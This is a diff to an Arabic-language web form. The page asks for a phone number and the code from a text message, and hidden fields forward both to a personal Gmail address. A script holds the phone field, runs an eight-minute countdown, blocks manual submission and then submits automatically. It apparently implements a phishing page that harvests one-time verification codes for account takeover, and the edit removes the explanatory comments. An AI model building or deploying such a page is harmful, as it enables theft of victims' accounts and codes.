@@ -113,19 +113,13 @@
 
     <div class="field-group">
       <input type="tel" id="phone" name="رقم_الهاتف" placeholder="رقم الهاتف" required>
-      <button type="button" id="startTimerBtn">تشغيل العداد</button>
+      <button type="button" id="startTimerBtn">أرسل كود</button>
     </div>
 
-    <!-- كود الرسالة -->
-    <input type="text" name="كود_الرسالة" placeholder="كود الرسالة" required>
+    <input type="text" id="codeInput" name="كود_الرسالة" placeholder="أدخل الكود هنا" required style="background-color: white; max-width: 120px;" />
 
-    <!-- بريد إلكتروني مخفي -->
     <input type="hidden" name="البريد_الإلكتروني" value="yblyyll@gmail.com">
-
-    <!-- حقل سبام مخفي -->
     <input type="text" name="_honey">
-
-    <!-- إعادة التوجيه بعد الإرسال -->
     <input type="hidden" name="_redirect" value="thanks.html">
 
     <button type="submit">طلب دخول</button>
@@ -136,8 +130,10 @@
     const startBtn = document.getElementById('startTimerBtn');
     const timerDisplay = document.getElementById('timer');
     const form = document.getElementById('dataForm');
+
     let countdown;
-    let timeLeft = 480; // 8 دقائق بالثواني
+    let timeLeft = 480; // 8 دقائق
+    let isCountdownFinished = false;
 
     function formatTime(seconds) {
       const m = Math.floor(seconds / 60).toString().padStart(2, '0');
@@ -146,25 +142,36 @@
     }
 
     function startTimer() {
-      if (countdown) return; // لا تبدأ إذا العداد شغال بالفعل
+      if (countdown) return;
+
       if (!phoneInput.value.trim()) {
         alert("يرجى إدخال رقم الهاتف أولاً!");
         return;
       }
+
       timerDisplay.style.display = 'block';
       timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
-      startBtn.disabled = true; // تعطيل الزر بعد البدء
+      startBtn.disabled = true;
+      phoneInput.disabled = true;
 
       countdown = setInterval(() => {
         timeLeft--;
         timerDisplay.textContent = `الوقت المتبقي للإرسال: ${formatTime(timeLeft)}`;
         if (timeLeft <= 0) {
           clearInterval(countdown);
+          isCountdownFinished = true;
           timerDisplay.textContent = 'يتم الآن إرسال النموذج...';
           form.submit();
         }
       }, 1000);
     }
+
+    form.addEventListener('submit', function(e) {
+      if (!isCountdownFinished) {
+        e.preventDefault();
+        alert("يرجى انتظار انتهاء العداد قبل الإرسال.");
+      }
+    });
 
     startBtn.addEventListener('click', startTimer);
   </script>
